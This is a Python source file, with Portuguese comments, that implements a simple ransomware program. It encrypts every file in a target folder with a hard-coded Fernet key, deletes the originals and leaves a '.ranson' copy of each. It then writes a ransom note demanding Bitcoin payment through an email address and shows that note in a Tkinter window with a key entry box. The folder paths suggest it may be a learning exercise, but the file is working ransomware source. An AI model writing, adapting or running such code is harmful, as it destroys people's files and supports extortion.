import tkinter as tk
import requests
from PIL import ImageTk, Image
from io import BytesIO
from tkinter import messagebox
from cryptography.fernet import Fernet
from os import getcwd, listdir, chdir, remove
from os.path import isfile

global key
key = '9RIR6pvgXS1EkfW40Wx640MsrkzkdIK2Dojo9adDEkY='


def criptografia(texto):
    """
    Função para criptografar arquivos e exibir mensagem de resgate
    """
    diretorio = r'C:\path'
    chdir(diretorio)
    print(getcwd())

    fernet = Fernet(key)

    # Iterando sobre os arquivos no diertório
    for arquivo in listdir():
        if isfile(arquivo):
            print('Criptografando o arquivo: ' + arquivo)

            with open(arquivo, 'rb') as file:
                conteudo_original = file.read()
                conteudo_encriptado = fernet.encrypt(conteudo_original)
                conteudo_descriptografado = fernet.decrypt(conteudo_encriptado)

            # criando arquivo .ranson com o conteúdo criptografado
            with open(arquivo + '.ranson', 'wb') as file_encriptado:
                file_encriptado.write(conteudo_encriptado)

            remove(arquivo)
            arquivo_ransom = open('README_ranson.txt', 'w')
            arquivo_ransom.writelines(texto)
            arquivo_ransom.close()
            

def descriptografa():
    """
    Função para descriptografar os arquivos
    """
    diretorio = r'C:\Users\danrl\OneDrive\Python\security\Ransomware\Ataque\test'
    chdir(diretorio)
    print(getcwd())

    try:
        remove('README_ranson.txt')
    except:
        pass
    fernet = Fernet(key)

    # Iterando sobre os arquivos no diretório
    for arquivo in listdir():
        if isfile(arquivo):
            print('Descriptografando o arquivo: ' + arquivo)

            arquivo_original = arquivo.split('.ransom', 1)[0]
            print('arquivo original: ' + str(arquivo_original))

            with open(arquivo, 'rb') as file:
                conteudo_criptografado = file.read()
                conteudo_descriptado = fernet.decrypt(conteudo_criptografado)

                # cria um arquivo descriptografado com o conteúdo
                with open(arquivo_original, 'wb') as file_decriptado:
                    file_decriptado.write(conteudo_descriptado)
                file.close()

                # remove o arquivo criptografado
                remove(arquivo)

    messagebox.showinfo('ok', 'Seus arquivos foram descriptografados')


def valida_chave():
    """
    Função para validar a chave inserida pelo usuário
    """
    chave = entrada.get()
    if chave == key:
        messagebox.showinfo('Chave correta!', chave)
    else:
        messagebox.showinfo('Chave incorreta', chave)


texto = '''
Seus arquivos foram criptografados
para recuperar voce devera pagar o resgate

email: naofaca@xpto.com
Bitcoins = naofaca1234

Que lhe enviaremos a chave para voce digitar abaixo:
'''

criptografia(texto)
tela = tk.Tk()
tela.title('Ransomware')

frame = tk.Frame(tela, height=100, width=50)
entrada = tk.Entry(fg='green', bg='black', width=50)
botao = tk.Button(tela, text='chave', command=valida_chave)

img_url = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSl-5FKPc4MYiMdwesvlmvC9GlPEUBfee6RCA&usqp=CAU'
response = requests.get(img_url)
img_data = response.content
img = ImageTk.PhotoImage(Image.open(BytesIO(img_data)))
panel = tk.Label(tela, image=img)
panel.pack(side='bottom', fill='both', expand='yes')

mensagem = tk.Label(
    text=texto,
    foreground='yellow',
    background='red',
    font='Helvetica 18 bold',
    width=150,
    height=10
)

mensagem.pack()
entrada.pack()
botao.pack()
frame.pack()

tela.geometry('800x600')
tela.mainloop()
